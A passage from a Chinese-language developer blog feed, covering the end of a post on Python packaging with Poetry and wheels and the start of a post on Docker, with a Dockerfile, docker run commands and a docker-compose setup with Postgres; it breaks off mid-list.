<code>python -m build</code> 类似，会在 dist/ 目录下生成两种类型的分发文件：</p><ul><li>Source distribution (sdist)：一个 .tar.gz 文件，用于源代码分发。</li><li>Wheel (bdist_wheel)：一个 .whl 文件，这是已编译的、便于安装的包格式。</li></ul><figure class="highlight toml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[tool.poetry]</span></span><br><span class="line"><span class="attr">name</span> = <span class="string">&quot;openzeppelin-solidity-grammar-parser&quot;</span></span><br><span class="line"><span class="attr">version</span> = <span class="string">&quot;0.0.4&quot;</span></span><br><span class="line"><span class="attr">description</span> = <span class="string">&quot;Solidity ANTLR4 grammar Python parser&quot;</span></span><br><span class="line"><span class="attr">authors</span> = [<span class="string">&quot;Georgii Plotnikov &lt;accembler@gmail.com&gt;&quot;</span>]</span><br><span class="line"><span class="attr">readme</span> = <span class="string">&quot;README.md&quot;</span></span><br><span class="line"><span class="attr">license</span> = <span class="string">&quot;MIT&quot;</span></span><br><span class="line"><span class="attr">homepage</span> = <span class="string">&quot;https://github.com/OpenZeppelin/sgp&quot;</span></span><br><span class="line"><span class="attr">repository</span> = <span class="string">&quot;https://github.com/OpenZeppelin/sgp&quot;</span></span><br><span class="line"><span class="attr">documentation</span> = <span class="string">&quot;https://github.com/OpenZeppelin/sgp&quot;</span></span><br><span class="line"><span class="attr">keywords</span> = [<span class="string">&quot;solidity&quot;</span>, <span class="string">&quot;parser&quot;</span>, <span class="string">&quot;antlr4&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="section">[tool.poetry.dependencies]</span></span><br><span class="line"><span class="attr">python</span> = <span class="string">&quot;&gt;=3.9&quot;</span></span><br><span class="line"><span class="attr">antlr4-python3-runtime</span> = <span class="string">&quot;4.13.1&quot;</span></span><br><span class="line"><span class="attr">coverage</span> = <span class="string">&quot;7.3.1&quot;</span></span><br><span class="line"><span class="attr">simplejson</span> = <span class="string">&quot;3.19.1&quot;</span></span><br><span class="line"><span class="attr">typing</span> = <span class="string">&quot;3.7.4.3&quot;</span></span><br><span class="line"><span class="attr">typing_extensions</span> = <span class="string">&quot;4.8.0&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="section">[tool.poetry.dev-dependencies]</span></span><br><span class="line"><span class="attr">black</span> = <span class="string">&quot;^23.0&quot;</span></span><br><span class="line"><span class="attr">ruff</span> = <span class="string">&quot;^0.0.288&quot;</span></span><br><span class="line"><span class="attr">pytest</span> = <span class="string">&quot;^7.0&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="section">[tool.poetry.packages]</span></span><br><span class="line"><span class="comment"># 只包含 sgp 目录下的代码</span></span><br><span class="line"><span class="comment"># 这将确保打包时只会包含 sgp 目录，而不会把其他项目文件夹（如 tests/、scripts/ 等）打包进来。</span></span><br><span class="line"><span class="attr">include</span> = [<span class="string">&quot;sgp&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这一部分用于指定额外要包含的非 Python 文件。</span></span><br><span class="line"><span class="section">[tool.poetry.include]</span></span><br><span class="line"><span class="comment"># 包含 README.md</span></span><br><span class="line"><span class="attr">README.md</span> = &#123; path = <span class="string">&quot;README.md&quot;</span>, format = <span class="string">&quot;text/markdown&quot;</span> &#125;</span><br><span class="line"><span class="comment"># 包含 LICENSE</span></span><br><span class="line"><span class="attr">LICENSE</span> = &#123; path = <span class="string">&quot;LICENSE&quot;</span>, format = <span class="string">&quot;text/plain&quot;</span> &#125;</span><br><span class="line"><span class="comment"># 包含某些其他文件</span></span><br><span class="line"><span class="attr">&quot;sgp/parser/*.tokens&quot;</span> = &#123; format = <span class="string">&quot;text/plain&quot;</span> &#125;</span><br><span class="line"></span><br><span class="line"><span class="section">[build-system]</span></span><br><span class="line"><span class="attr">requires</span> = [<span class="string">&quot;poetry-core&gt;=1.1.0&quot;</span>]</span><br><span class="line"><span class="attr">build-backend</span> = <span class="string">&quot;poetry.core.masonry.api&quot;</span></span><br></pre></td></tr></table></figure><p>而且 <code>poetry install</code> 不仅会安装好依赖，还会执行了类似 <code>pip install -e .</code> 的功能，执行了可编辑模式安装。</p><h1>代码编译分发</h1><p>上一小节介绍了如何打包，并且介绍了 2 种打包生成的文件。。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dist/</span><br><span class="line">    my_package-0.1.0.tar.gz</span><br><span class="line">    my_package-0.1.0-py3-none-any.whl</span><br></pre></td></tr></table></figure><p>这里两种分发包都是可以安装的 <code>pip install dist/my_package-0.1.0-py3-none-any.whl</code> 和 <code>pip install dist/my_package-0.1.0.tar.gz</code></p><p>安装源代码分发包时，pip 会从源代码构建包，这通常涉及到编译步骤。如果项目中有 C 扩展或其他需要编译的代码，安装时会需要构建工具（如 gcc、make 等）来编译这些部分。这种方式兼容性好。但是构建时如果出问题，需要使用者具备比较深入的知识。如果你的项目包含 C 扩展或其他需要编译的代码，源代码分发包是必不可少的。</p><p><code>.whl</code> 文件是一种标准的 Python 二进制包格式，它是预编译好的包。包含编译后的文件，并且已经处理好所有依赖，因此安装时不需要再次编译。Wheel 包通常包括预编译的 C 扩展、二进制文件以及纯 Python 文件。安装速度快，不用编译，但是是平台和架构相关的，需要编译多个版本。<br>发布的时候，使用 <code>twine upload dist/*</code>。</p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;Python 包的开发是一项重要的技能，可以帮助你组织代码、实现代码复用，并且将功能模块分发给其他开发者使用。&lt;/p&gt;
&lt;h1&gt;包和模块是什么&lt;/h1&gt;
&lt;p&gt;在 Python 中，一个包（Package）就是一个包含多个模块的目录，其中通过 &lt;code&gt;__init__.py&lt;/code&gt; 文件来表明它是一个包。包允许你将代码逻辑分解为多个文件，并且通过模块的方式进行导入和复用。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;模块：一个 Python 文件（*.py 文件）就是一个模块。模块可以包含函数、类和变量。&lt;/li&gt;
&lt;li&gt;包：包是包含多个模块的文件夹。包使得模块之间可以被组织起来，以便更好的管理</summary>
        
      
    
    
    
    <category term="developer" scheme="https://www.blog-blockchain.xyz/categories/developer/"/>
    
    
    <category term="developer" scheme="https://www.blog-blockchain.xyz/tags/developer/"/>
    
  </entry>
  
  <entry>
    <title>docker自动化</title>
    <link href="https://www.blog-blockchain.xyz/dev/docker/"/>
    <id>https://www.blog-blockchain.xyz/dev/docker/</id>
    <published>2024-10-21T06:22:20.000Z</published>
    <updated>2024-11-18T09:44:38.945Z</updated>
    
    <content type="html"><![CDATA[<h1>了解背景</h1><p>Docker 是一种轻量级的容器化技术，主要用于<strong>应用程序的环境迁移和一致性</strong>。你需要知道下面的基本概念：</p><ul><li>了解镜像、容器的基本概念：<a href="https://yeasy.gitbook.io/docker_practice/basic_concept">https://yeasy.gitbook.io/docker_practice/basic_concept</a></li><li>数据卷的基本概念：<a href="https://yeasy.gitbook.io/docker_practice/data_management/volume">https://yeasy.gitbook.io/docker_practice/data_management/volume</a></li><li>网络方面，端口映射、docker compose 容器互联：<a href="https://yeasy.gitbook.io/docker_practice/network/port_mapping">https://yeasy.gitbook.io/docker_practice/network/port_mapping</a></li></ul><p>OK，上面三个基本概念，你就足够使用 docker 了，然后我们来了解 docker 最实用的地方：</p><ol><li>环境迁移，在不同的机器上保持一致性，一次创建或配置，可以在任意地方正常运行。。</li><li>直接在 docker 内利用 linux 环境和路径挂载来开发。<ol><li>隔离依赖、统一开发环境、快速启动。</li><li>利用 Linux 容器作为开发环境：在不同平台（Windows、Mac、Linux）上保持一致的开发环境。</li><li>通过 volumes 实现容器与主机的文件共享，利用挂载路径在本地编辑代码，并在容器中即时运行。典型场景：在容器中运行应用，同时在本地编辑源代码（热重载），也可以使用 vscode remote.</li></ol></li></ol><blockquote><p>docker 还有更加高级的配置，比如说可以让容器直接绑定网卡，处理网络包的数据，进行网卡级别的数据转发工作。这在软路由或者旁路由中用处比较多。这里会涉及到很多的细节，比如使用网卡的时候，和 host 的网络冲突和隔离等。作为开发和运行环境，暂时不会接触到这些。</p></blockquote><h1>用起来</h1><h2 id="Dockerfile">Dockerfile</h2><p>这是镜像的配置文件，教程可以参考：<a href="https://yeasy.gitbook.io/docker_practice/image/build">https://yeasy.gitbook.io/docker_practice/image/build</a> ，我们会更多的从例子学习。</p><figure class="highlight docker"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># syntax=docker/dockerfile:1.4  # 指定Dockerfile的语法版本，确保使用最新功能</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># -------------------------------------</span></span><br><span class="line"><span class="comment"># 第一阶段：构建阶段（Build Stage）</span></span><br><span class="line"><span class="comment"># 使用多阶段构建：减少最终镜像的大小，只保留构建完成后的应用程序，而不包含开发工具</span></span><br><span class="line"><span class="comment"># -------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用轻量级的 Python 基础镜像作为构建环境</span></span><br><span class="line"><span class="keyword">FROM</span> python:<span class="number">3.9</span>-slim AS builder</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置环境变量，确保Python在无缓存模式下运行，减少镜像大小</span></span><br><span class="line"><span class="keyword">ENV</span> PYTHONDONTWRITEBYTECODE=<span class="number">1</span>  <span class="comment"># 防止Python写入.pyc文件</span></span><br><span class="line"><span class="keyword">ENV</span> PYTHONUNBUFFERED=<span class="number">1</span>         <span class="comment"># 确保日志信息（stdout和stderr）实时输出</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置工作目录</span></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> /app</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装系统依赖</span></span><br><span class="line"><span class="comment"># 使用 `--no-install-recommends` 以避免安装额外不需要的包，保持镜像精简</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apt-get update &amp;&amp; apt-get install -y --no-install-recommends \</span></span><br><span class="line"><span class="language-bash">    build-essential \</span></span><br><span class="line"><span class="language-bash">    libpq-dev \</span></span><br><span class="line"><span class="language-bash">    curl \</span></span><br><span class="line"><span class="language-bash">    &amp;&amp; <span class="built_in">rm</span> -rf /var/lib/apt/lists/*  <span class="comment"># 清理缓存以减小镜像大小</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 复制requirements.txt文件到容器，并安装依赖</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> requirements.txt .</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> pip install --user --no-cache-dir -r requirements.txt  <span class="comment"># 使用--no-cache-dir避免缓存</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment"># -------------------------------------</span></span><br><span class="line"><span class="comment"># 第二阶段：运行阶段（Runtime Stage）</span></span><br><span class="line"><span class="comment"># 这里是最终生成的镜像，只保留运行所需的内容，确保镜像尽量小</span></span><br><span class="line"><span class="comment"># -------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用一个更小的基础镜像作为运行时环境</span></span><br><span class="line"><span class="keyword">FROM</span> python:<span class="number">3.9</span>-slim</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置环境变量</span></span><br><span class="line"><span class="keyword">ENV</span> PYTHONDONTWRITEBYTECODE=<span class="number">1</span>  <span class="comment"># 防止Python写入.pyc文件</span></span><br><span class="line"><span class="keyword">ENV</span> PYTHONUNBUFFERED=<span class="number">1</span>         <span class="comment"># 确保日志信息（stdout和stderr）实时输出</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置工作目录</span></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> /app</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 复制已安装的依赖，从build阶段复制</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> --from=builder /root/.local /root/.local</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 确保pip的安装路径可用</span></span><br><span class="line"><span class="keyword">ENV</span> PATH=/root/.local/bin:$PATH</span><br><span class="line"></span><br><span class="line"><span class="comment"># 复制应用源代码到工作目录</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> . .</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 暴露应用程序端口（例如Flask默认端口5000）</span></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">5000</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置运行时的用户为非root用户，提升安全性</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> useradd -m appuser</span></span><br><span class="line"><span class="keyword">USER</span> appuser</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置应用程序的入口点，容器会运行这个命令。</span></span><br><span class="line"><span class="keyword">CMD</span><span class="language-bash"> [<span class="string">&quot;python&quot;</span>, <span class="string">&quot;app.py&quot;</span>]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 这会定期检查 Flask 应用是否在端口 5000 正常运行，如果检查失败，Docker 会认为容器不健康。</span></span><br><span class="line"><span class="keyword">HEALTHCHECK</span><span class="language-bash"> --interval=30s --<span class="built_in">timeout</span>=10s --retries=3 CMD curl --fail http://localhost:5000 || <span class="built_in">exit</span> 1</span></span><br></pre></td></tr></table></figure><h3 id="基础命令">基础命令</h3><ul><li>FROM 设置基础镜像，</li><li>ENV 设置环境变量，构建和运行的时候都会生效。</li><li>WORKDIR 指定工作目录，</li><li><code>USER</code> 则是改变之后层的执行 <code>RUN</code>, <code>CMD</code> 以及 <code>ENTRYPOINT</code> 这类命令的身份。</li><li>COPY 复制项目文件到镜像，</li><li><code>EXPOSE</code> 指令是声明容器运行时提供服务的端口，这只是一个声明，在容器运行时并不会因为这个声明应用就会开启这个端口的服务。在 Dockerfile 中写入这样的声明有两个好处，一个是帮助镜像使用者理解这个镜像服务的守护端口，以方便配置映射；另一个用处则是在运行时使用随机端口映射时，也就是 <code>docker run -P</code> 时，会自动随机映射 <code>EXPOSE</code> 的端口。</li><li>CMD 主要用于定义容器启动时的默认命令或参数，可以被用户在 docker run 命令行中覆盖。注意建议使用这种列表的格式，因为能够避免一些多重引号的冲突。</li><li>ENTRYPOINT：用于固定的默认启动，指定了一个容器启动时必须执行的命令，这个命令不容易被覆盖，除非使用 --entrypoint 选项。应该放在 CMD 前面，并且用于完成固定的初始化任务和运行服务。</li><li><code>HEALTHCHECK</code> 指令是告诉 Docker 应该如何进行判断容器的状态是否正常，<ul><li><code>-interval=&lt;间隔&gt;</code>：两次健康检查的间隔，默认为 30 秒；</li><li><code>-timeout=&lt;时长&gt;</code>：健康检查命令运行超时时间，如果超过这个时间，本次健康检查就被视为失败，默认 30 秒；</li><li><code>-retries=&lt;次数&gt;</code>：当连续失败指定次数后，则将容器状态视为 <code>unhealthy</code>，默认 3 次。</li></ul></li></ul><h3 id="多级构建">多级构建</h3><p>这里采用了<strong>多阶段构建</strong>，builder 这个镜像实际上只使用了 /root/.local 里构建好的东西，这个镜像会保存作为缓存，但是不会用于运行应用。python:3.9-slim 是实际运行应用的镜像，因为构建时安装的很多依赖，在运行的时候不需要。这么做有如下好处：</p><ol><li><p><strong>减少镜像大小</strong>：builder 阶段安装了所有开发工具和依赖，但它不会包含在最终的运行镜像中。最终镜像只包含最少的运行环境和应用程序本身。例如，python:3.9-slim 镜像的体积非常小（约 55MB），相比于完整的 python:3.9 镜像（约 885MB），这在部署生产环境时极大减少了资源占用。</p></li><li><p><strong>提高构建速度</strong>：通过 Docker 的缓存机制，当你修改代码但没有修改依赖时，Docker 只需要重新复制代码，而不必重新安装依赖。如果依赖没有变化，Docker 会使用 builder 阶段的缓存，加速后续的构建。</p></li></ol><h3 id="构建、运行、停止、删除容器">构建、运行、停止、删除容器</h3><p><strong>构建命令</strong>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker build -f docker/Dockerfile -t my-app ..</span><br></pre></td></tr></table></figure><p>这里指定构建的镜像的命名，还有上下文 <code>..</code> 是上级目录，会作为相对路径的参考。-t 选项为生成的镜像指定一个名称，果你想要指定版本或标签，可以这样使用 <code>my-app:1.0</code></p><p>构建镜像后，你可以通过 docker run 命令来<strong>运行容器</strong>。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">docker run -d -p 8080:80 \</span><br><span class="line">  -v /path/to/api_key.txt:/run/secrets/api_key.txt \</span><br><span class="line">  -e API_KEY=my-secret-key \</span><br><span class="line">  --name my-app-container my-app</span><br></pre></td></tr></table></figure><p>-d：-d 表示容器将在后台运行（“detached mode”），即以守护进程的方式运行。这对于运行长期服务（如 Web 服务器）很有用。</p><p>-p 8080:80：-p 选项将宿主机的端口映射到容器的端口。在这个例子中，将宿主机的 8080 端口映射到容器的 80 端口，假设你的应用在容器内的 80 端口上运行。访问 <a href="http://localhost:8080/">http://localhost:8080</a> 就相当于访问容器内的服务。</p><p>-v 是挂载文件到容器，</p><p>-name 是自定义容器的名字，</p><p>-name my-app-container：为容器指定一个名称，方便后续操作和管理。你可以通过容器名称来启动、停止、删除或查看日志。如果不指定名称，Docker 会随机生成一个名称。<br>my-app：这是刚才构建的镜像名称。Docker 会基于这个镜像启动容器。</p><p>这里是运行默认的命令，我们可以在 my-app 后面加上自己的命令，用于自定义的运行。例如 <code>docker run -d -p 8080:80 --name my-app-container my-app python [app.py](http://app.py/)</code></p><p>如果希望<strong>交互式的运行</strong>，</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -it --name my-app-container my-app bash</span><br></pre></td></tr></table></figure><p>-it：-i 表示交互模式，-t 表示为容器分配一个伪终端。使用这两个选项可以进入容器并与容器进行交互。</p><p>bash：启动容器时运行 bash，这样你可以获得容器内的命令行。</p><p>当你不再需要容器时，可以通过以下命令<strong>停止容器</strong>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker stop my-app-container</span><br></pre></td></tr></table></figure><p>docker stop：停止一个运行中的容器。你可以通过容器的名称或 ID 来指定它。</p><p>当你不再需要容器时，可以通过以下命令<strong>删除容器</strong>：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker <span class="built_in">rm</span> my-app-container</span><br></pre></td></tr></table></figure><p><strong>导入密钥的最佳实践</strong></p><p>有时候容器里需要导入密钥来运行某些应用，一般的做法可以：</p><ol><li>使用卷挂载，然后读取，可以参考之前的命令。</li><li>运行的时候指定环境变量，可以参考之前的命令。</li><li>使用 docker compose 来运行</li></ol><p>❗ 不要在 dockerfile 里写入隐私的密钥，环境变量是可以查看的</p><h2 id="Docker-compose">Docker compose</h2><p><a href="https://yeasy.gitbook.io/docker_practice/compose/introduction">简介 | Docker — 从入门到实践</a></p><p><code>Compose</code> 定位是 「定义和运行多个 Docker 容器的应用（Defining and running multi-container Docker applications）」，其前身是开源项目 Fig。一个 <code>Dockerfile</code> 模板文件，可以让用户很方便的定义一个单独的应用容器。然而，在日常工作中，经常会碰到需要多个容器相互配合来完成某项任务的情况。例如要实现一个 Web 项目，除了 Web 服务容器本身，往往还需要再加上后端的数据库服务容器，甚至还包括负载均衡容器等。</p><p><code>Compose</code> 恰好满足了这样的需求。它允许用户通过一个单独的 <code>docker-compose.yml</code> 模板文件（YAML 格式）来定义一组相关联的应用容器为一个项目（project）。</p><p><code>Compose</code> 中有两个重要的概念：</p><ul><li>服务 (<code>service</code>)：一个应用的容器，实际上可以包括若干运行相同镜像的容器实例。</li><li>项目 (<code>project</code>)：由一组关联的应用容器组成的一个完整业务单元，在 <code>docker-compose.yml</code> 文件中定义。</li></ul><p><code>Compose</code> 的默认管理对象是项目，通过子命令对项目中的一组容器进行便捷地生命周期管理。</p><h3 id="编写-docker-compose">编写 docker compose</h3><p>主要规定了每个服务怎么启动，以及依赖关系。学习下面的例子，模仿配置的格式：</p><ol><li>container_name，image，ports 这些都是固定的写法。</li><li>默认从当前目录的 .env 文件读取环境变量，并且相对路径是相对命令行所在的命令，而不是 dockerfile 里那样，手动设置的上下文。所以从哪里启动 docker compose，是比较重要的。</li><li>healthcheck 也比较常用，因为其他服务可能依赖这个服务正常运行，所以设置了检查健康的方式。用的方式是命令的返回码为 0。比如 curl 返回结果非 2xx，或者超时；命令行命令执行异常。</li><li><code>volumes</code> 有两种类型，一种是卷，类似 esdata01，直接挂载到目录。一种是本地文件，用相对位置寻找，./init.sql:/docker-entrypoint-initdb.d/init.sql，有些特定位置的文件会执行特定操作。比如说当数据库未初始化时，会执行。</li></ol><p>对于项目，build 会根据指定的 dockerfile 构建，得到镜像。但是除了 build 之外 context 路径毫无影响，其他的配置都是用命令行路径作为相对路径的参考。如果要设置默认的命令，可以参考</p><figure class="highlight docker"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">entrypoint</span><span class="language-bash">: [<span class="string">&quot;python&quot;</span>, <span class="string">&quot;/prompt-engine/src/main.py&quot;</span>]</span></span><br><span class="line">command: [<span class="string">&quot;-fpath&quot;</span>, <span class="string">&quot;projects/shanxuan&quot;</span>, <span class="string">&quot;-id&quot;</span>, <span class="string">&quot;1000shanxuan&quot;</span>, <span class="string">&quot;-cmd&quot;</span>, <span class="string">&quot;detect&quot;</span>, <span class="string">&quot;-o&quot;</span>, <span class="string">&quot;output/shanxuan.xlsx&quot;</span>]</span><br></pre></td></tr></table></figure><figure class="highlight docker"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">services:</span><br><span class="line">  prompt-engine:</span><br><span class="line">    build:</span><br><span class="line">      context: ..</span><br><span class="line">      dockerfile: ./docker/Dockerfile</span><br><span class="line">    volumes:</span><br><span class="line">      - ../projects:/prompt-engine/projects       <span class="comment"># 挂载项目根目录的 src 目录到容器中</span></span><br><span class="line">      - ../output:/prompt-engine/output <span class="comment"># 挂载项目根目录的 output 目录到容器中</span></span><br><span class="line">    env_file: ./.<span class="keyword">env</span></span><br><span class="line">    depends_on:</span><br><span class="line">      postgres:</span><br><span class="line">        condition: service_healthy</span><br><span class="line">    <span class="comment"># command: python /prompt-engine/src/main.py -fpath projects/shanxuan -id 1000shanxuan -cmd detect -o output/shanxuan.xlsx</span></span><br><span class="line">    networks:</span><br><span class="line">      - prompt</span><br><span class="line">    environment:</span><br><span class="line">      DATABASE_URL: <span class="string">&quot;postgresql://$&#123;POSTGRES_USER_NAME&#125;:$&#123;POSTGRES_PASSWORD&#125;@postgres:5432/$&#123;POSTGRES_DB_NAME&#125;&quot;</span></span><br><span class="line">      OPENAI_API_BASE: <span class="string">&quot;$&#123;OPENAI_API_BASE&#125;&quot;</span></span><br><span class="line">      OPENAI_API_KEY: <span class="string">&quot;$&#123;OPENAI_API_KEY&#125;&quot;</span></span><br><span class="line">      VUL_MODEL_ID: <span class="string">&quot;$&#123;VUL_MODEL_ID&#125;&quot;</span></span><br><span class="line">      AZURE_API_KEY: <span class="string">&quot;$&#123;AZURE_API_KEY&#125;&quot;</span></span><br><span class="line">      AZURE_API_BASE: <span class="string">&quot;$&#123;AZURE_API_BASE&#125;&quot;</span></span><br><span class="line">      AZURE_API_VERSION: <span class="string">&quot;$&#123;AZURE_API_VERSION&#125;&quot;</span></span><br><span class="line">      AZURE_DEPLOYMENT_NAME: <span class="string">&quot;$&#123;AZURE_DEPLOYMENT_NAME&#125;&quot;</span></span><br><span class="line">      AZURE_OR_OPENAI: <span class="string">&quot;$&#123;AZURE_OR_OPENAI&#125;&quot;</span></span><br><span class="line">      BUSINESS_FLOW_COUNT: <span class="string">&quot;$&#123;BUSINESS_FLOW_COUNT&#125;&quot;</span></span><br><span class="line">      SWITCH_FUNCTION_CODE: <span class="string">&quot;$&#123;SWITCH_FUNCTION_CODE&#125;&quot;</span></span><br><span class="line">      SWITCH_BUSINESS_CODE: <span class="string">&quot;$&#123;SWITCH_BUSINESS_CODE&#125;&quot;</span></span><br><span class="line"></span><br><span class="line">  postgres:</span><br><span class="line">    image: postgres:<span class="number">13</span></span><br><span class="line">    container_name: Prompt-Postgres</span><br><span class="line">    volumes:</span><br><span class="line">      - prompt_postgres_data:/var/lib/postgresql/data</span><br><span class="line">      - ./init.sql:/docker-<span class="keyword">entrypoint</span><span class="language-bash">-initdb.d/init.sql  <span class="comment"># 添加初始化 SQL 脚本</span></span></span><br><span class="line">    environment:</span><br><span class="line">      - POSTGRES_DB=$&#123;POSTGRES_DB_NAME&#125;</span><br><span class="line">      - POSTGRES_USER=$&#123;POSTGRES_USER_NAME&#125;</span><br><span class="line">      - POSTGRES_PASSWORD=$&#123;POSTGRES_PASSWORD&#125;</span><br><span class="line">    ports:</span><br><span class="line">      - $&#123;POSTGRES_PORT&#125;:<span class="number">5432</span>  <span class="comment"># 将容器内的5432端口映射到主机的5433端口</span></span><br><span class="line">    networks:</span><br><span class="line">      - prompt</span><br><span class="line">    restart: always</span><br><span class="line">    <span class="keyword">healthcheck</span><span class="language-bash">:</span></span><br><span class="line">      test: [<span class="string">&quot;CMD-SHELL&quot;</span>, <span class="string">&quot;pg_isready -U $&#123;POSTGRES_USER_NAME&#125; -d $&#123;POSTGRES_DB_NAME&#125;&quot;</span>]</span><br><span class="line">      interval: <span class="number">10</span>s</span><br><span class="line">      timeout: <span class="number">5</span>s</span><br><span class="line">      retries: <span class="number">5</span></span><br><span class="line">      start_period: <span class="number">30</span>s</span><br><span class="line"></span><br><span class="line">networks:</span><br><span class="line">  prompt:</span><br><span class="line">    driver: bridge</span><br><span class="line"></span><br><span class="line">volumes:</span><br><span class="line">  prompt_postgres_data:</span><br><span class="line">    driver: local</span><br></pre></td></tr></table></figure><h3 id="常用命令"><strong>常用命令</strong></h3><ul><li><strong>docker-compose up</strong>命令用于构建和启动所有在 docker-compose.yml 